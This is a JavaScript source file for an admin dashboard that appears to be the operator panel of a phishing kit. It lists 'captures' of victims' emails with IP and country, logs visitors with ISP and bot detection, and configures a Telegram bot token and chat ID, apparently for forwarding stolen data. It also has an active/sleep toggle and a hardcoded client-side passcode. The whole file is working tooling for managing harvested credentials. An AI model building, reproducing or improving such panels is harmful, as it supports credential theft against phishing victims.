(function(){
    const PASSCODE='1100';
    let refreshTimer=null;
    const DOM={};

    function cacheDom(){
        DOM.headerTime=document.getElementById('headerTime');
        DOM.statVisitors=document.getElementById('statVisitors');
        DOM.statBots=document.getElementById('statBots');
        DOM.statCaptures=document.getElementById('statCaptures');
        DOM.statUnique=document.getElementById('statUnique');
        DOM.statTelegram=document.getElementById('statTelegram');
        DOM.statTelegramStatus=document.getElementById('statTelegramStatus');
        DOM.statMode=document.getElementById('statMode');
        DOM.configStatus=document.getElementById('configStatus');
        DOM.capturesBody=document.getElementById('capturesBody');
        DOM.capturesCount=document.getElementById('capturesCount');
        DOM.visitorsBody=document.getElementById('visitorsBody');
        DOM.visitorsCount=document.getElementById('visitorsCount');
        DOM.activityBody=document.getElementById('activityBody');
        DOM.errorBody=document.getElementById('errorBody');
        DOM.errorCount=document.getElementById('errorCount');
        DOM.telegramToken=document.getElementById('telegramToken');
        DOM.chatId=document.getElementById('chatId');
        DOM.passcode=document.getElementById('passcode');
        DOM.modeValue=document.getElementById('modeValue');
        DOM.modeActive=document.getElementById('modeActive');
        DOM.modeSleep=document.getElementById('modeSleep');
        DOM.statusMessage=document.getElementById('statusMessage');
        DOM.telegramTestResult=document.getElementById('telegramTestResult');
        DOM.adminForm=document.getElementById('adminForm');
        DOM.loginScreen=document.getElementById('loginScreen');
        DOM.dashboardContent=document.getElementById('dashboardContent');
        DOM.passcodeInput=document.getElementById('passcodeInput');
        DOM.loginBtn=document.getElementById('loginBtn');
        DOM.loginError=document.getElementById('loginError');
        DOM.attemptsDisplay=document.getElementById('attemptsDisplay');
    }

    function formatTime(iso){
        if(!iso)return'N/A';
        try{const d=new Date(iso);return d.toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}
        catch{return'N/A'}
    }

    function escapeHtml(t){if(!t)return'';const d=document.createElement('div');d.textContent=t;return d.innerHTML}
    function truncate(s,m){if(!s)return'';return s.length>m?s.substring(0,m)+'...':s}

    let attempts=3,isLocked=false;

    function showStatus(msg,type){
        const el=DOM.statusMessage;
        el.style.display='block';
        el.textContent=msg;
        const c={success:{bg:'#0a2a1a',color:'#00b894',border:'#00b894'},error:{bg:'#2a1a0a',color:'#e17055',border:'#e17055'},info:{bg:'#0a1a2a',color:'#64b5f6',border:'#64b5f6'}};
        const s=c[type]||c.info;
        el.style.background=s.bg;el.style.color=s.color;el.style.border='1px solid '+s.border;
        clearTimeout(el._timeout);el._timeout=setTimeout(()=>{el.style.display='none'},4000);
    }

    function updateHeaderTime(){
        if(DOM.headerTime){
            DOM.headerTime.textContent=new Date().toLocaleString('en-US',{hour12:false,year:'numeric',month:'short',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
        }
    }

    function initModeToggle(){
        if(DOM.modeActive){
            DOM.modeActive.addEventListener('click',function(){
                DOM.modeValue.value='active';
                this.className='toggle-btn active';
                DOM.modeSleep.className='toggle-btn';
            });
        }
        if(DOM.modeSleep){
            DOM.modeSleep.addEventListener('click',function(){
                DOM.modeValue.value='sleep';
                this.className='toggle-btn sleep';
                DOM.modeActive.className='toggle-btn';
            });
        }
    }

    function renderStats(data){
        const s=data.stats||{};
        DOM.statVisitors.textContent=s.total_visitors||0;
        DOM.statBots.textContent=s.total_bots||0;
        DOM.statCaptures.textContent=s.total_captures||0;
        DOM.statUnique.textContent=s.unique_ips||0;
        const mode=data.config?.mode||'active';
        DOM.statMode.textContent=mode==='active'?'🟢 Active':'🔴 Sleep';
        DOM.statMode.style.color=mode==='active'?'#00b894':'#e17055';
        const tg=data.telegram||{};
        if(tg.configured&&tg.status==='connected'){
            DOM.statTelegram.textContent='✅';
            DOM.statTelegram.style.color='#00b894';
            DOM.statTelegramStatus.textContent='Connected';
        }else if(tg.configured){
            DOM.statTelegram.textContent='⚠️';
            DOM.statTelegram.style.color='#fdcb6e';
            DOM.statTelegramStatus.textContent=tg.status||'Error';
        }else{
            DOM.statTelegram.textContent='❌';
            DOM.statTelegram.style.color='#e17055';
            DOM.statTelegramStatus.textContent='Not configured';
        }
        DOM.configStatus.textContent=s.total_visitors>0?'📊 Live':'Ready';
    }

    function renderCaptures(data){
        const captures=data.logs?.captures||[];
        DOM.capturesCount.textContent=captures.length;
        if(captures.length===0){
            DOM.capturesBody.innerHTML='<tr><td colspan="5" class="text-muted" style="text-align:center;padding:20px;">No captures yet</td></tr>';
            return;
        }
        DOM.capturesBody.innerHTML=captures.map(c=>`
            <tr><td>${formatTime(c.timestamp)}</td><td>${escapeHtml(c.type||'Unknown')}</td><td>${escapeHtml(truncate(c.email||'N/A',30))}</td><td>${escapeHtml(c.ip||'N/A')}</td><td>${escapeHtml(c.country||'Unknown')}</td></tr>
        `).join('');
    }

    function renderVisitors(data){
        const visitors=data.logs?.visitors||[];
        DOM.visitorsCount.textContent=visitors.length;
        if(visitors.length===0){
            DOM.visitorsBody.innerHTML='<tr><td colspan="6" class="text-muted" style="text-align:center;padding:20px;">No visitors yet</td></tr>';
            return;
        }
        DOM.visitorsBody.innerHTML=visitors.slice(0,50).map(v=>`
            <tr><td>${formatTime(v.timestamp)}</td><td>${escapeHtml(v.ip||'N/A')}</td><td>${escapeHtml(v.page||'/')}</td><td>${escapeHtml(v.country||'Unknown')}</td><td>${escapeHtml(v.isp||'Unknown')}</td><td><span class="${v.is_bot?'bot-tag':'human-tag'}">${v.is_bot?'🤖 Bot':'👤 Human'}</span></td></tr>
        `).join('');
    }

    function renderActivity(data){
        const activity=data.logs?.activity||[];
        if(activity.length===0){
            DOM.activityBody.innerHTML='<div style="padding:6px 0;border-bottom:1px solid #0f0f1a;color:#6c6c8a;">Waiting for activity...</div>';
            return;
        }
        DOM.activityBody.innerHTML=activity.slice(0,20).map(a=>`
            <div style="padding:4px 0;border-bottom:1px solid #0f0f1a;display:flex;justify-content:space-between;align-items:center;">
                <span style="font-size:12px;">${escapeHtml(a.message||'Action')}</span>
                <span style="color:#4a4a6a;font-size:11px;">${formatTime(a.time)}</span>
            </div>
        `).join('');
    }

    function renderErrors(data){
        const errors=data.logs?.errors||[];
        DOM.errorCount.textContent=errors.length;
        if(errors.length===0){
            DOM.errorBody.innerHTML='<div style="padding:12px;text-align:center;color:#6c6c8a;">No errors logged</div>';
            return;
        }
        DOM.errorBody.innerHTML=errors.slice(0,30).map(e=>`
            <div style="padding:4px 0;border-bottom:1px solid #0f0f1a;font-size:11px;font-family:monospace;">
                <span style="color:#6c6c8a;">[${formatTime(e.timestamp)}]</span>
                <span style="color:#e17055;">${escapeHtml(e.type||'Error')}:</span>
                <span style="color:#e8c8c8;">${escapeHtml(e.message||'Unknown error')}</span>
                ${e.ip?`<span style="color:#6c6c8a;font-size:10px;"> | IP: ${e.ip}</span>`:''}
            </div>
        `).join('');
    }

    function renderForm(data){
        const config=data.config||{};
        DOM.telegramToken.value=config.telegram_token||'';
        DOM.chatId.value=config.chat_id||'';
        const mode=config.mode||'active';
        DOM.modeValue.value=mode;
        if(mode==='sleep'){
            DOM.modeSleep.className='toggle-btn sleep';
            DOM.modeActive.className='toggle-btn';
        }else{
            DOM.modeActive.className='toggle-btn active';
            DOM.modeSleep.className='toggle-btn';
        }
    }

    async function loadData(){
        try{
            const res=await fetch('/api/admin',{headers:{'X-Admin-Passcode':PASSCODE}});
            if(!res.ok)throw new Error('HTTP '+res.status);
            const data=await res.json();
            if(data.status==='success'){
                renderStats(data);
                renderCaptures(data);
                renderVisitors(data);
                renderActivity(data);
                renderErrors(data);
                renderForm(data);
                return true;
            }
            throw new Error(data.message||'Unknown error');
        }catch(err){
            console.error(err);
            return false;
        }
    }

    function refreshData(){loadData();showStatus('🔄 Refreshed','info');}

    async function testTelegram(){
        const token=DOM.telegramToken.value;
        const chatId=DOM.chatId.value;
        const passcode=DOM.passcode.value;
        if(passcode!==PASSCODE){
            DOM.telegramTestResult.textContent='❌ Invalid passcode';
            DOM.telegramTestResult.style.color='#e17055';
            return;
        }
        if(!token||!chatId){
            DOM.telegramTestResult.textContent='❌ Enter Token & Chat ID';
            DOM.telegramTestResult.style.color='#e17055';
            return;
        }
        try{
            const res=await fetch('/api/admin',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({passcode,telegram_token:token,chat_id:chatId,mode:DOM.modeValue.value})
            });
            const data=await res.json();
            if(data.telegram_status==='connected'){
                DOM.telegramTestResult.textContent='✅ Connected!';
                DOM.telegramTestResult.style.color='#00b894';
            }else{
                DOM.telegramTestResult.textContent='⚠️ Status: '+(data.telegram_status||'Unknown');
                DOM.telegramTestResult.style.color='#fdcb6e';
            }
            loadData();
        }catch(err){
            DOM.telegramTestResult.textContent='❌ Error: '+err.message;
            DOM.telegramTestResult.style.color='#e17055';
        }
    }

    function clearErrorLog(){
        if(!confirm('Clear all errors?'))return;
        fetch('/api/admin/clear-errors',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({passcode:PASSCODE})
        }).then(res=>res.json()).then(data=>{
            if(data.status==='success'){loadData();showStatus('🗑️ Errors cleared','info')}
        }).catch(()=>{});
    }

    function exportErrorLog(){
        const errors=document.getElementById('errorBody').textContent;
        const blob=new Blob([errors],{type:'text/plain'});
        const url=URL.createObjectURL(blob);
        const a=document.createElement('a');
        a.href=url;
        a.download='error_log_'+new Date().toISOString().slice(0,10)+'.txt';
        a.click();
        URL.revokeObjectURL(url);
        showStatus('📥 Error log downloaded','success');
    }

    function attemptLogin(){
        if(isLocked)return;
        const input=DOM.passcodeInput.value.trim();
        if(input===PASSCODE){
            sessionStorage.setItem('admin_session','authenticated');
            DOM.loginError.style.display='none';
            DOM.attemptsDisplay.style.display='none';
            DOM.loginScreen.style.display='none';
            DOM.dashboardContent.style.display='block';
            initDashboard();
        }else{
            attempts--;
            DOM.passcodeInput.value='';
            DOM.passcodeInput.classList.add('shake');
            setTimeout(()=>DOM.passcodeInput.classList.remove('shake'),300);
            if(attempts<=0){
                isLocked=true;
                DOM.loginError.textContent='❌ Account locked. Try again later.';
                DOM.loginError.style.display='block';
                DOM.attemptsDisplay.style.display='none';
                DOM.passcodeInput.disabled=true;
                DOM.loginBtn.disabled=true;
                DOM.loginBtn.style.opacity='0.5';
                DOM.loginBtn.textContent='🔒 Locked';
            }else{
                DOM.loginError.textContent='❌ Invalid passcode';
                DOM.loginError.style.display='block';
                DOM.attemptsDisplay.textContent='Attempts remaining: '+attempts;
                DOM.attemptsDisplay.style.display='block';
                DOM.passcodeInput.focus();
            }
        }
    }

    function logoutAdmin(){
        sessionStorage.removeItem('admin_session');
        location.reload();
    }

    function checkSession(){
        if(sessionStorage.getItem('admin_session')==='authenticated'){
            DOM.loginScreen.style.display='none';
            DOM.dashboardContent.style.display='block';
            initDashboard();
        }
    }

    function initDashboard(){
        loadData();
        if(refreshTimer)clearInterval(refreshTimer);
        refreshTimer=setInterval(loadData,8000);
        let uptime=0;
        setInterval(()=>{
            uptime++;
            document.getElementById('statUptime').textContent='Uptime: '+uptime+'s';
        },1000);
        console.log('⚡ Admin Panel initialized');
    }

    function initFormSubmit(){
        DOM.adminForm.addEventListener('submit',async function(e){
            e.preventDefault();
            const passcode=DOM.passcode.value;
            const token=DOM.telegramToken.value;
            const chatId=DOM.chatId.value;
            const mode=DOM.modeValue.value;
            if(passcode!==PASSCODE){showStatus('❌ Invalid passcode','error');return;}
            try{
                const res=await fetch('/api/admin',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({passcode,telegram_token:token,chat_id:chatId,mode})
                });
                const data=await res.json();
                if(data.status==='success'){
                    showStatus('✅ Saved! TG: '+(data.telegram_status==='connected'?'✅ Connected':'⚠️ '+data.telegram_status),'success');
                    loadData();
                }else{
                    showStatus('❌ Error: '+data.message,'error');
                }
            }catch(err){
                showStatus('❌ Network error','error');
            }
        });
    }

    window.refreshData=refreshData;
    window.testTelegram=testTelegram;
    window.clearErrorLog=clearErrorLog;
    window.exportErrorLog=exportErrorLog;
    window.logoutAdmin=logoutAdmin;

    function init(){
        cacheDom();
        initModeToggle();
        initFormSubmit();
        updateHeaderTime();
        setInterval(updateHeaderTime,1000);
        DOM.loginBtn.addEventListener('click',attemptLogin);
        DOM.passcodeInput.addEventListener('keydown',function(e){
            if(e.key==='Enter')attemptLogin();
            if(this.value.length>4)this.value=this.value.slice(0,4);
        });
        DOM.passcodeInput.addEventListener('input',function(){
            if(this.value.length>4)this.value=this.value.slice(0,4);
        });
        document.addEventListener('keydown',function(e){
            if(e.ctrlKey&&e.shiftKey&&e.key==='L')logoutAdmin();
        });
        checkSession();
        console.log('⚡ Admin Panel loaded');
    }

    if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',init);}
    else{init();}
})();